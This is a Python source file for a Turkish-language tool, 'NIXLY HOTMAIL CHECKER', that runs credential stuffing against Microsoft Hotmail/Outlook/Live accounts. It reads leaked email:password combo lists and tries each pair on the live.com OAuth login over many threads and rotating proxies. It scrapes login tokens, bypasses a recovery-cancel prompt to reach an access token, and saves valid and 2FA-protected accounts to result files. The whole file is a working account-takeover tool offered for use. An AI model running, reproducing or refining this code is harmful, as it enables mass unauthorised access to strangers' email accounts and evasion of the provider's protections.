# NIXLY HOTMAIL CHECKER TOOL v1.2
# Hotmail/Outlook/Live checker - Ultra hizli | Full Capture
# Kullanim: python3 nixly_hotmail_tool.py
# Requirements: pip install requests urllib3

import os
import re
import sys
import time
import random
import threading
import requests
import urllib3
from datetime import datetime
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BRAND = "NIXLY HOTMAIL CHECKER"
VERSION = "1.2"
RESULT_DIR = "result"
DEFAULT_THREADS = 30
DEFAULT_TIMEOUT = 15
MAX_THREADS = 100

STATS = {"checked": 0, "valid": 0, "twofa": 0, "bad": 0, "error": 0}
LOCK = threading.Lock()

R = "\033[0m"
G = "\033[92m"
RD = "\033[91m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
CY = "\033[96m"
W = "\033[97m"
D = "\033[90m"


def banner():
    print()
    print(f"{CY}{'=' * 72}{R}")
    print(f"{Y}  NIXLY HOTMAIL CHECKER TOOL v{VERSION}{R}")
    print(f"{Y}  Hotmail / Outlook / Live | Proxy | Result{R}")
    print(f"{CY}{'=' * 72}{R}")
    print()
    print(f"{G}  [+] Hotmail / Outlook / Live{R}")
    print(f"{G}  [+] RPS login (Xbox OAuth){R}")
    print(f"{G}  [+] A-Shell uyumlu (max {MAX_THREADS} thread){R}")
    print(f"{G}  [+] Proxy destegi{R}")
    print(f"{G}  [+] Sonuclar result/ klasorune{R}")
    print()
    print(f"{CY}{'=' * 72}{R}")
    print(f"{M}  Powered by NIXLY{R}")
    print(f"{CY}{'=' * 72}{R}")
    print()


def log(tag, msg, color=W):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{D}[{ts}]{R} {color}{tag}{R} {msg}")


def normalize_combo(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    for sep in (":", "|", ";", ","):
        if sep in line:
            parts = line.split(sep, 1)
            u = parts[0].strip()
            p = parts[1].strip()
            if u and p and "@" in u:
                return f"{u}:{p}"
    if " " in line:
        parts = line.split(" ", 1)
        u = parts[0].strip()
        p = parts[1].strip()
        if u and p and "@" in u:
            return f"{u}:{p}"
    return None


def scan_txt_files(directory="."):
    files = []
    try:
        for f in sorted(os.listdir(directory)):
            if f.lower().endswith(".txt"):
                full = os.path.join(directory, f)
                if os.path.isfile(full):
                    try:
                        size = os.path.getsize(full)
                        count = 0
                        with open(full, "r", encoding="utf-8", errors="ignore") as fh:
                            for _ in fh:
                                count += 1
                                if count >= 100000:
                                    break
                        count_str = "100k+" if count >= 100000 else f"{count:,}"
                    except Exception:
                        size = 0
                        count_str = "?"
                    files.append((f, full, size, count_str))
    except Exception as e:
        log("[!]", f"Klasor okunamadi: {e}", RD)
    return files


def ask_combo_source():
    import tkinter as tk
    from tkinter import filedialog

    print(f"{CY}COMBO DOSYASI SEC{R}")
    print(f"  {D}Dosya secme penceresi aciliyor...{R}")
    print()

    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)

    path = filedialog.askopenfilename(
        title="Combo dosyasini sec",
        filetypes=[("Text dosyalari", "*.txt"), ("Tum dosyalar", "*.*")]
    )
    root.destroy()

    if not path:
        log("[!]", "Dosya secilmedi", RD)
        return None

    if not os.path.isfile(path):
        log("[!]", f"Dosya bulunamadi: {path}", RD)
        return None

    log("[+]", f"Secilen dosya: {os.path.basename(path)}", G)
    return path


def ask_proxy():
    print()
    print(f"{CY}PROXY KULLANIMI{R}")
    print(f"  {Y}[1]{R} Proxy dosyasi kullan")
    print(f"  {Y}[2]{R} Proxy kullanma")
    print()
    while True:
        try:
            choice = input(f"{CY}Secim (1/2): {R}").strip()
        except (EOFError, KeyboardInterrupt):
            return []
        if choice == "2":
            return []
        if choice == "1":
            try:
                path = input(f"{CY}Proxy dosya yolu: {R}").strip().strip('"').strip("'")
            except (EOFError, KeyboardInterrupt):
                return []
            if not os.path.isfile(path):
                log("[!]", f"Proxy dosyasi bulunamadi: {path}", RD)
                continue
            proxies = []
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        proxies.append(line)
            if not proxies:
                log("[!]", "Proxy listesi bos", RD)
                continue
            log("[+]", f"{len(proxies)} proxy yuklendi", G)
            return proxies


def format_proxy(p):
    if not p:
        return None
    p = p.strip()
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in p:
        return f"http://{p}"
    return f"http://{p}"


def create_session(proxy=None):
    s = requests.Session()
    s.verify = False
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    })
    return s


class HotmailChecker:
    def __init__(self, email, password, proxy=None, timeout=DEFAULT_TIMEOUT):
        self.email = email
        self.password = password
        self.timeout = timeout
        self.session = create_session(proxy)
        self.url = ("https://login.live.com/oauth20_authorize.srf?"
                    "client_id=00000000402B5328"
                    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                    "&display=touch&response_type=token&locale=en")

    def get_ft(self):
        for _ in range(3):
            try:
                t = self.session.get(self.url, timeout=self.timeout).text
                m = (re.search('value=\\\\\\"(.+?)\\\\\\"', t, re.S)
                     or re.search('value="(.+?)"', t, re.S)
                     or re.search("sFTTag:'(.+?)'", t, re.S)
                     or re.search('sFTTag:"(.+?)"', t, re.S)
                     or re.search('name="PPFT".*?value="(.+?)"', t, re.S))
                if m:
                    tag = m.group(1)
                    m2 = (re.search('"urlPost":"(.+?)"', t, re.S)
                          or re.search("urlPost:'(.+?)'", t, re.S)
                          or re.search('urlPost:"(.+?)"', t, re.S)
                          or re.search('<form.*?action="(.+?)"', t, re.S))
                    if m2:
                        return m2.group(1).replace("&amp;", "&"), tag
            except Exception:
                pass
            time.sleep(0.2)
        return None, None

    def rps(self, urlPost, sFTTag):
        for _ in range(3):
            try:
                data = {"login": self.email, "loginfmt": self.email,
                        "passwd": self.password, "PPFT": sFTTag}
                r = self.session.post(urlPost, data=data, allow_redirects=True,
                                      timeout=self.timeout)

                # Basarili giris
                if "#" in r.url and r.url != self.url:
                    token = parse_qs(urlparse(r.url).fragment).get("access_token", ["None"])[0]
                    if token != "None":
                        return "SUCCESS"

                # Cancel flow (dogrulama kaldi)
                if "cancel?mkt=" in r.text:
                    try:
                        ipt = re.search(r'(?<="ipt" value=").+?(?=">)', r.text)
                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', r.text)
                        uaid = re.search(r'(?<="uaid" value=").+?(?=">)', r.text)
                        if ipt and pprid and uaid:
                            data2 = {"ipt": ipt.group(), "pprid": pprid.group(), "uaid": uaid.group()}
                            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r.text)
                            if action:
                                ret = self.session.post(action.group(), data=data2,
                                                        allow_redirects=True,
                                                        timeout=self.timeout)
                                ret_url = re.search(
                                    r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)',
                                    ret.text)
                                if ret_url:
                                    fin = self.session.get(ret_url.group(),
                                                           allow_redirects=True,
                                                           timeout=self.timeout)
                                    token = parse_qs(urlparse(fin.url).fragment).get(
                                        "access_token", ["None"])[0]
                                    if token != "None":
                                        return "SUCCESS"
                    except Exception:
                        pass

                # 2FA
                if any(v in r.text for v in [
                    "recover?mkt", "account.live.com/identity/confirm?mkt",
                    "Email/Confirm?mkt", "/Abuse?mkt="]):
                    return "2FA"

                # Bad
                if any(v in r.text.lower() for v in [
                    "password is incorrect",
                    "account doesn't exist",
                    "that microsoft account doesn't exist",
                    "sign in to your microsoft account",
                    "tried to sign in too many times with an incorrect account or password",
                    "help us protect your account"]):
                    return "BAD"
            except Exception:
                pass
            time.sleep(0.2)
        return "BAD"

    def check(self):
        u, t = self.get_ft()
        if not u or not t:
            return "BAD"
        return self.rps(u, t)


def format_valid(combo):
    sep = "=" * 72
    return (f"{sep}\n"
            f"  NIXLY HOTMAIL CHECKER v{VERSION}\n"
            f"{sep}\n\n"
            f"Giris  : {combo}\n"
            f"Durum  : VALID\n"
            f"Config : NIXLY\n\n"
            f"{sep}\n"
            f"  Powered by NIXLY\n"
            f"{sep}\n")


def format_2fa(combo):
    sep = "=" * 72
    return (f"{sep}\n"
            f"  NIXLY HOTMAIL CHECKER v{VERSION}\n"
            f"{sep}\n\n"
            f"Giris  : {combo}\n"
            f"Durum  : 2FA GEREKLI\n"
            f"Config : NIXLY\n\n"
            f"{sep}\n"
            f"  Powered by NIXLY\n"
            f"{sep}\n")


def save_result(filename, content):
    os.makedirs(RESULT_DIR, exist_ok=True)
    with open(os.path.join(RESULT_DIR, filename), "a", encoding="utf-8") as f:
        f.write(content + "\n")


def save_simple(filename, line):
    os.makedirs(RESULT_DIR, exist_ok=True)
    with open(os.path.join(RESULT_DIR, filename), "a", encoding="utf-8") as f:
        f.write(line + "\n")


def check_one(combo, proxy):
    global STATS
    try:
        if ":" not in combo:
            return
        email, password = combo.split(":", 1)
        email = email.strip()
        password = password.strip()

        chk = HotmailChecker(email, password, proxy)
        status = chk.check()

        with LOCK:
            STATS["checked"] += 1
            if status == "SUCCESS":
                STATS["valid"] += 1
                save_result("valid.txt", format_valid(combo))
                save_simple("valid_simple.txt", combo)
                print(f"{G}[+] VALID{R} {combo}")
            elif status == "2FA":
                STATS["twofa"] += 1
                save_result("2fa.txt", format_2fa(combo))
                save_simple("2fa_simple.txt", combo)
                print(f"{Y}[?] 2FA  {R} {combo}")
            else:
                STATS["bad"] += 1
                save_simple("bad_simple.txt", combo)
                print(f"{RD}[-] BAD  {R} {combo}")
    except Exception as e:
        with LOCK:
            STATS["error"] += 1
            print(f"{Y}[!] ERR  {R} {combo} {D}({e}){R}")


def run_checker(accounts, proxies, threads):
    total = len(accounts)
    log("[+]", f"Toplam {total} combo islenecek", M)
    log("[i]", f"Thread: {threads} | Proxy: {len(proxies)}", B)
    print()

    start = time.time()
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = []
        for combo in accounts:
            proxy = format_proxy(random.choice(proxies)) if proxies else None
            futures.append(ex.submit(check_one, combo, proxy))
        for _ in as_completed(futures):
            pass

    elapsed = time.time() - start
    print()
    print(f"{CY}{'=' * 72}{R}")
    print(f"{CY}  SONUC{R}")
    print(f"{CY}{'=' * 72}{R}")
    print(f"  {W}Toplam   :{R} {STATS['checked']}")
    print(f"  {G}Valid    :{R} {STATS['valid']}")
    print(f"  {Y}2FA      :{R} {STATS['twofa']}")
    print(f"  {RD}Bad      :{R} {STATS['bad']}")
    print(f"  {Y}Hata     :{R} {STATS['error']}")
    print(f"  {W}Sure     :{R} {elapsed:.1f}s")
    if elapsed > 0:
        cpm = int(STATS["checked"] / elapsed * 60)
        print(f"  {M}Hiz      :{R} {cpm} CPM")
    print(f"  {CY}Sonuclar :{R} {RESULT_DIR}/")
    print(f"{CY}{'=' * 72}{R}")
    print()


def main():
    banner()

    combo_path = ask_combo_source()
    if not combo_path:
        log("[!]", "Combo kaynagi secilmedi", RD)
        return

    print()
    log("[~]", f"Combo listesi okunuyor: {combo_path}", Y)
    accounts = []
    seen = set()
    try:
        with open(combo_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                n = normalize_combo(line)
                if n and n not in seen:
                    seen.add(n)
                    accounts.append(n)
    except Exception as e:
        log("[!]", f"Dosya okunamadi: {e}", RD)
        return

    if not accounts:
        log("[!]", "Gecerli combo bulunamadi", RD)
        return

    log("[+]", f"{len(accounts)} gecerli combo yuklendi", G)

    proxies = ask_proxy()

    print()
    print(f"{CY}THREAD SAYISI{R}")
    print(f"  {D}Varsayilan: {DEFAULT_THREADS} | Max: {MAX_THREADS} (Enter'a bas){R}")
    try:
        t_input = input(f"{CY}Thread: {R}").strip()
    except (EOFError, KeyboardInterrupt):
        return
    if t_input:
        try:
            threads = max(1, min(int(t_input), MAX_THREADS))
        except ValueError:
            threads = DEFAULT_THREADS
    else:
        threads = DEFAULT_THREADS

    print()
    print(f"{CY}{'-' * 72}{R}")
    print(f"  Combo   : {len(accounts)}")
    print(f"  Thread  : {threads}")
    print(f"  Proxy   : {len(proxies) if proxies else 'Yok'}")
    print(f"  Kaynak  : {combo_path}")
    print(f"{CY}{'-' * 72}{R}")
    print()
    try:
        input(f"{CY}Baslamak icin Enter'a bas...{R}")
    except (EOFError, KeyboardInterrupt):
        return

    run_checker(accounts, proxies, threads)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RD}[!] Durduruldu{R}")
